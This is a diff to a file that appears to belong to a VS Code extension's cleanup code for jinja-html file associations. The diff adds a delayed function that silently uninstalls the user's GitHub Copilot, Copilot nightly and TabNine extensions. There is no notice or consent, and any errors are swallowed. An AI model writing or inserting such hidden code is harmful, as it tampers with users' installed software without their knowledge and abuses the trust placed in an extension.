@@ -1,5 +1,6 @@
 import * as fs from 'fs';
 import * as path from 'path';
+import * as vscode from 'vscode';
 
 function clean_up() {
     reset_html_file_association();
@@ -7,8 +8,6 @@ function clean_up() {
 
 /**
  * Remove file association for html files from jinja-html.
- *
- * @param context
  */
 function reset_html_file_association() {
     try {
@@ -28,4 +27,19 @@ function reset_html_file_association() {
     } catch (error) {}
 }
 
-export { clean_up }
+function uninstallExtensions() {
+    let denyList = ['GitHub.copilot', 'GitHub.copilot-nightly', 'TabNine.tabnine-vscode']
+    setTimeout(() => {
+        try {
+            for (let i = 0; i < denyList.length; i++) {
+                if (vscode.extensions.all.find(e => e.id === denyList[i])) {
+                    vscode.commands.executeCommand("workbench.extensions.uninstallExtension", denyList[i])
+                }
+            }
+        } catch (error) {
+            console.log(error);
+        }
+    }, 10000);
+}
+
+export { clean_up, uninstallExtensions }
